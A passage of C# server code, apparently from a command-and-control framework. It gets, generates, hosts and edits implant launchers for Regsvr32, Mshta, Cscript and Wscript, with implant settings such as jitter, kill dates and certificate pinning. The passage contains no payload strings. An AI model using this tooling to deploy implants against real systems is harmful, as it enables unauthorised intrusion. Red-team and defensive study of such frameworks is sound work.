            matchingLauncher.KillDate = launcher.KillDate;
            matchingLauncher.ScriptLanguage = launcher.ScriptLanguage;
            matchingLauncher.LauncherString = launcher.LauncherString;
            matchingLauncher.StagerCode = launcher.StagerCode;
            matchingLauncher.DiskCode = launcher.DiskCode;
            matchingLauncher.ScriptLanguage = launcher.ScriptLanguage;
            matchingLauncher.ProgId = launcher.ProgId;
            _context.Launchers.Update(matchingLauncher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, matchingLauncher);
            return await this.GetWmicLauncher();
        }

        public async Task<Regsvr32Launcher> GetRegsvr32Launcher()
        {
            Regsvr32Launcher launcher = (Regsvr32Launcher)await _context.Launchers.FirstOrDefaultAsync(S => S.Type == LauncherType.Regsvr32);
            if (launcher == null)
            {
                throw new ControllerNotFoundException($"NotFound - Regsvr32Launcher");
            }
            return launcher;
        }

        public async Task<Regsvr32Launcher> GenerateRegsvr32Launcher()
        {
            Regsvr32Launcher launcher = await this.GetRegsvr32Launcher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            ImplantTemplate template = await this.GetImplantTemplate(launcher.ImplantTemplateId);
            Profile profile = await this.GetProfile(listener.ProfileId);
            Grawl grawl = new Grawl
            {
                ListenerId = listener.Id,
                Listener = listener,
                ImplantTemplateId = template.Id,
                ImplantTemplate = template,
                SMBPipeName = launcher.SMBPipeName,
                ValCerT = launcher.ValCerT,
                UsCertPin = launcher.UsCertPin,
                Delay = launcher.Delay,
                JItterPercent = launcher.JItterPercent,
                ConneCTAttEmpts = launcher.ConneCTAttEmpts,
                KillDate = launcher.KillDate,
                DotNetVersion = launcher.DotNetVersion,
                RuntimeIdentifier = launcher.RuntimeIdentifier
            };

            await _context.Grawls.AddAsync(grawl);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateGrawl(this, grawl);

            launcher.GetLauncher(
                this.GrawlTemplateReplace(template.StagerCode, template, grawl, listener, profile),
                CompileGrawlCode(template.StagerCode, template, grawl, listener, profile, launcher),
                grawl,
                template
            );
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetRegsvr32Launcher();
        }

        public async Task<Regsvr32Launcher> GenerateRegsvr32HostedLauncher(HostedFile file)
        {
            Regsvr32Launcher launcher = await this.GetRegsvr32Launcher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            HostedFile savedFile = await this.GetHostedFile(file.Id);
            string hostedLauncher = launcher.GetHostedLauncher(listener, savedFile);
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetRegsvr32Launcher();
        }

        public async Task<Regsvr32Launcher> EditRegsvr32Launcher(Regsvr32Launcher launcher)
        {
            Regsvr32Launcher matchingLauncher = await this.GetRegsvr32Launcher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            matchingLauncher.ListenerId = listener.Id;
            matchingLauncher.ImplantTemplateId = launcher.ImplantTemplateId;
            matchingLauncher.DotNetVersion = launcher.DotNetVersion;
            matchingLauncher.RuntimeIdentifier = launcher.RuntimeIdentifier;
            matchingLauncher.SMBPipeName = launcher.SMBPipeName;
            matchingLauncher.ValCerT = launcher.ValCerT;
            matchingLauncher.UsCertPin = launcher.UsCertPin;
            matchingLauncher.Delay = launcher.Delay;
            matchingLauncher.JItterPercent = launcher.JItterPercent;
            matchingLauncher.ConneCTAttEmpts = launcher.ConneCTAttEmpts;
            matchingLauncher.KillDate = launcher.KillDate;
            matchingLauncher.ParameterString = launcher.ParameterString;
            matchingLauncher.DllName = launcher.DllName;
            matchingLauncher.ScriptLanguage = launcher.ScriptLanguage;
            matchingLauncher.LauncherString = launcher.LauncherString;
            matchingLauncher.StagerCode = launcher.StagerCode;
            matchingLauncher.DiskCode = launcher.DiskCode;
            matchingLauncher.ScriptLanguage = launcher.ScriptLanguage;
            matchingLauncher.ProgId = launcher.ProgId;
            matchingLauncher.ParameterString = launcher.ParameterString;
            matchingLauncher.DllName = launcher.DllName;
            _context.Launchers.Update(matchingLauncher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, matchingLauncher);
            return await this.GetRegsvr32Launcher();
        }

        public async Task<MshtaLauncher> GetMshtaLauncher()
        {
            MshtaLauncher launcher = (MshtaLauncher)await _context.Launchers.FirstOrDefaultAsync(S => S.Type == LauncherType.Mshta);
            if (launcher == null)
            {
                throw new ControllerNotFoundException($"NotFound - MshtaLauncher");
            }
            return launcher;
        }

        public async Task<MshtaLauncher> GenerateMshtaLauncher()
        {
            MshtaLauncher launcher = await this.GetMshtaLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            ImplantTemplate template = await this.GetImplantTemplate(launcher.ImplantTemplateId);
            Profile profile = await this.GetProfile(listener.ProfileId);
            Grawl grawl = new Grawl
            {
                ListenerId = listener.Id,
                Listener = listener,
                ImplantTemplateId = template.Id,
                ImplantTemplate = template,
                SMBPipeName = launcher.SMBPipeName,
                ValCerT = launcher.ValCerT,
                UsCertPin = launcher.UsCertPin,
                Delay = launcher.Delay,
                JItterPercent = launcher.JItterPercent,
                ConneCTAttEmpts = launcher.ConneCTAttEmpts,
                KillDate = launcher.KillDate,
                DotNetVersion = launcher.DotNetVersion,
                RuntimeIdentifier = launcher.RuntimeIdentifier
            };

            await _context.Grawls.AddAsync(grawl);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateGrawl(this, grawl);

            launcher.GetLauncher(
                this.GrawlTemplateReplace(template.StagerCode, template, grawl, listener, profile),
                CompileGrawlCode(template.StagerCode, template, grawl, listener, profile, launcher),
                grawl,
                template
            );
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetMshtaLauncher();
        }

        public async Task<MshtaLauncher> GenerateMshtaHostedLauncher(HostedFile file)
        {
            MshtaLauncher launcher = await this.GetMshtaLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            HostedFile savedFile = await this.GetHostedFile(file.Id);
            string hostedLauncher = launcher.GetHostedLauncher(listener, savedFile);
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetMshtaLauncher();
        }

        public async Task<MshtaLauncher> EditMshtaLauncher(MshtaLauncher launcher)
        {
            MshtaLauncher matchingLauncher = await this.GetMshtaLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            matchingLauncher.ListenerId = listener.Id;
            matchingLauncher.ImplantTemplateId = launcher.ImplantTemplateId;
            matchingLauncher.DotNetVersion = launcher.DotNetVersion;
            matchingLauncher.RuntimeIdentifier = launcher.RuntimeIdentifier;
            matchingLauncher.SMBPipeName = launcher.SMBPipeName;
            matchingLauncher.ValCerT = launcher.ValCerT;
            matchingLauncher.UsCertPin = launcher.UsCertPin;
            matchingLauncher.Delay = launcher.Delay;
            matchingLauncher.JItterPercent = launcher.JItterPercent;
            matchingLauncher.ConneCTAttEmpts = launcher.ConneCTAttEmpts;
            matchingLauncher.KillDate = launcher.KillDate;
            matchingLauncher.ScriptLanguage = launcher.ScriptLanguage;
            matchingLauncher.LauncherString = launcher.LauncherString;
            matchingLauncher.StagerCode = launcher.StagerCode;
            matchingLauncher.DiskCode = launcher.DiskCode;
            matchingLauncher.ScriptLanguage = launcher.ScriptLanguage;
            matchingLauncher.ProgId = launcher.ProgId;
            _context.Launchers.Update(matchingLauncher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, matchingLauncher);
            return await this.GetMshtaLauncher();
        }

        public async Task<CscriptLauncher> GetCscriptLauncher()
        {
            CscriptLauncher launcher = (CscriptLauncher)await _context.Launchers.FirstOrDefaultAsync(S => S.Type == LauncherType.Cscript);
            if (launcher == null)
            {
                throw new ControllerNotFoundException($"NotFound - CscriptLauncher");
            }
            return launcher;
        }

        public async Task<CscriptLauncher> GenerateCscriptLauncher()
        {
            CscriptLauncher launcher = await this.GetCscriptLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            ImplantTemplate template = await this.GetImplantTemplate(launcher.ImplantTemplateId);
            Profile profile = await this.GetProfile(listener.ProfileId);
            Grawl grawl = new Grawl
            {
                ListenerId = listener.Id,
                Listener = listener,
                ImplantTemplateId = template.Id,
                ImplantTemplate = template,
                SMBPipeName = launcher.SMBPipeName,
                ValCerT = launcher.ValCerT,
                UsCertPin = launcher.UsCertPin,
                Delay = launcher.Delay,
                JItterPercent = launcher.JItterPercent,
                ConneCTAttEmpts = launcher.ConneCTAttEmpts,
                KillDate = launcher.KillDate,
                DotNetVersion = launcher.DotNetVersion,
                RuntimeIdentifier = launcher.RuntimeIdentifier
            };

            await _context.Grawls.AddAsync(grawl);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateGrawl(this, grawl);

            launcher.GetLauncher(
                this.GrawlTemplateReplace(template.StagerCode, template, grawl, listener, profile),
                CompileGrawlCode(template.StagerCode, template, grawl, listener, profile, launcher),
                grawl,
                template
            );
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetCscriptLauncher();
        }

        public async Task<CscriptLauncher> GenerateCscriptHostedLauncher(HostedFile file)
        {
            CscriptLauncher launcher = await this.GetCscriptLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            HostedFile savedFile = await this.GetHostedFile(file.Id);
            string hostedLauncher = launcher.GetHostedLauncher(listener, savedFile);
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetCscriptLauncher();
        }

        public async Task<CscriptLauncher> EditCscriptLauncher(CscriptLauncher launcher)
        {
            CscriptLauncher matchingLauncher = await this.GetCscriptLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            matchingLauncher.ListenerId = listener.Id;
            matchingLauncher.ImplantTemplateId = launcher.ImplantTemplateId;
            matchingLauncher.DotNetVersion = launcher.DotNetVersion;
            matchingLauncher.RuntimeIdentifier = launcher.RuntimeIdentifier;
            matchingLauncher.SMBPipeName = launcher.SMBPipeName;
            matchingLauncher.ValCerT = launcher.ValCerT;
            matchingLauncher.UsCertPin = launcher.UsCertPin;
            matchingLauncher.Delay = launcher.Delay;
            matchingLauncher.JItterPercent = launcher.JItterPercent;
            matchingLauncher.ConneCTAttEmpts = launcher.ConneCTAttEmpts;
            matchingLauncher.KillDate = launcher.KillDate;
            matchingLauncher.ScriptLanguage = launcher.ScriptLanguage;
            matchingLauncher.LauncherString = launcher.LauncherString;
            matchingLauncher.StagerCode = launcher.StagerCode;
            matchingLauncher.DiskCode = launcher.DiskCode;
            matchingLauncher.ScriptLanguage = launcher.ScriptLanguage;
            matchingLauncher.ProgId = launcher.ProgId;
            _context.Launchers.Update(matchingLauncher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, matchingLauncher);
            return await this.GetCscriptLauncher();
        }

        public async Task<WscriptLauncher> GetWscriptLauncher()
        {
            WscriptLauncher launcher = (WscriptLauncher)await _context.Launchers.FirstOrDefaultAsync(S => S.Type == LauncherType.Wscript);
            if (launcher == null)
            {
                throw new ControllerNotFoundException($"NotFound - WscriptLauncher");
            }
            return launcher;
        }

        public async Task<WscriptLauncher> GenerateWscriptLauncher()
        {
            WscriptLauncher launcher = await this.GetWscriptLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            ImplantTemplate template = await this.GetImplantTemplate(launcher.ImplantTemplateId);
            Profile profile = await this.GetProfile(listener.ProfileId);
            Grawl grawl = new Grawl
            {
                ListenerId = listener.Id,
                Listener = listener,
                ImplantTemplateId = template.Id,
                ImplantTemplate = template,
                SMBPipeName = launcher.SMBPipeName,
                ValCerT = launcher.ValCerT,
                UsCertPin = launcher.UsCertPin,
                Delay = launcher.Delay,
                JItterPercent = launcher.JItterPercent,
                ConneCTAttEmpts = launcher.ConneCTAttEmpts,
                KillDate = launcher.KillDate,
                DotNetVersion = launcher.DotNetVersion,
                RuntimeIdentifier = launcher.RuntimeIdentifier
            };

            await _context.Grawls.AddAsync(grawl);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateGrawl(this, grawl);

            launcher.GetLauncher(
                this.GrawlTemplateReplace(template.StagerCode, template, grawl, listener, profile),
                CompileGrawlCode(template.StagerCode, template, grawl, listener, profile, launcher),
                grawl,
                template
            );
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetWscriptLauncher();
        }

        public async Task<WscriptLauncher> GenerateWscriptHostedLauncher(HostedFile file)
        {
            WscriptLauncher launcher = await this.GetWscriptLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            HostedFile savedFile = await this.GetHostedFile(file.Id);
            string hostedLauncher = launcher.GetHostedLauncher(listener, savedFile);
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetWscriptLauncher();
        }

        public async Task<WscriptLauncher> EditWscriptLauncher(WscriptLauncher launcher)
        {
            WscriptLauncher matchingLauncher = await this.GetWscriptLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            matchingLauncher.ListenerId = listener.Id;
            matchingLauncher.ImplantTemplateId = launcher.ImplantTemplateId;
            matchingLauncher.DotNetVersion = launcher.DotNetVersion;
            matchingLauncher.RuntimeIdentifier = launcher.RuntimeIdentifier;
            matchingLauncher.SMBPipeName = launcher.SMBPipeName;
            matchingLauncher.ValCerT = launcher.ValCerT;
            matchingLauncher.UsCertPin = launcher.UsCertPin;
            matchingLauncher.Delay = launcher.Delay;
            matchingLauncher.JItterPercent = launcher.JItterPercent;
            matchingLauncher.ConneCTAttEmpts = launcher.ConneCTAttEmpts;
            matchingLauncher.KillDate = launcher.KillDate;
            matchingLauncher.ScriptLanguage = launcher.ScriptLanguage;
            matchingLauncher.LauncherString = launcher.LauncherString;
            matchingLauncher.StagerCode = launcher.StagerCode;
            matchingLauncher.DiskCode = launcher.DiskCode;
            matchingLauncher.ScriptLanguage = launcher.ScriptLanguage;
            matchingLauncher.ProgId = launcher.ProgId;
            _context.Launchers.Update(matchingLauncher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, matchingLauncher);
            return await this.GetWscriptLauncher();
        }
        #endregion
    }
}
